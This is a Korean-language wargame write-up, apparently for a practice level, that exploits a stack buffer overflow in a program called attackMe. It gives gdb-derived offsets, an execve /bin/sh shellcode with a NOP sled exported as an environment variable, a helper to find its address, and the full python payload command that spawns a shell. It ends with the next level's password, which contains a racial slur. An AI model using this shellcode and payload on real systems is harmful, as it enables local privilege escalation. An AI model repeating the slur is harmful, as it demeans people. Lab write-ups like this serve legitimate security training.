gdb 해서 뜯어보면

i가 0x1234567 인데 i가 저 값이 아닐 경우 프로그램이 죽으니
저값을 오버플로우공격할떄 같이 입력해줘서 조건문을 통과시킨다.

계속해서 정보를 알아내보면

buf 에서 ebp 까지의 거리는 1048

buf 에서 ret 까지의 거리 1052 ( 1048 + 4)

그리고 비교하는 구문에서

ebp-12 는 i에서 ebp까지의 거리가 12라는 소리이고

ret까지의 거리까지는 12 +4 인 16이다.

최종적으로 buf 에서 i까지의 거리는

(buf 에서 ret까지의거리) - (i에서 ret까지의 거리) = 1052 - 16 = 1036

i변수의 끝에서 ret까지의 거리는 

(i에서 ret까지의 거리) - i의 크기(long형의 크기는 4바이트) 16-12 = 12

이제 이정보로 쉘코드를 등록시켜보자 많이 사용하는 25바이트 쉘코드를 사용해보자.

이제 한번 환경변수를 등록해주자.

export shellcode=$(python -c 'print "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

를 등록해준다.

그리고 주소를 구하기위해 소스코드를 작성해준다.

vi shell.c

int main()
{
	printf("%p\n",getenv("shellcode");
	return 0;
}


을 적고 gcc -o shell shell.c 를 입력해주고 컴파일을 해준다.

그리고 실행하면 주소가나오는데 이제 다구했다. 

이제 오버플로우 공격을 해보자

총 페이로드가 1052 이다. 우리가 구한 주소는 ret 4바이트 즉 12비트가 빈다.

따라서 공백 * 1036 + i 주소 + 12바이트 공백에 +"ret주소"

./attackMe `python -c 'print "\x90"*1036+"i주소"+"\x90"*12+"ret 주소"'`

를 입력하면 쉘을 얻게되는데 my-pass를 입력하면 level14의 패스워드를 얻을수있다.

@@@@@

ret 주소

###################################### 

( 실패원인 >> 내가 환경변수 설정할떄 $를 주지않아서 그럼)
0xbffffe9f			,,   다시 한번더 0xbfff ff 45

(실패) 한 주소들
####################################

주소 0xbffffefb 이거로 만들기	(올바른 주소)

############################################

sh-2.05b$ my-pass
TERM environment variable not set.

Level14 Password is "what that nigga want?".

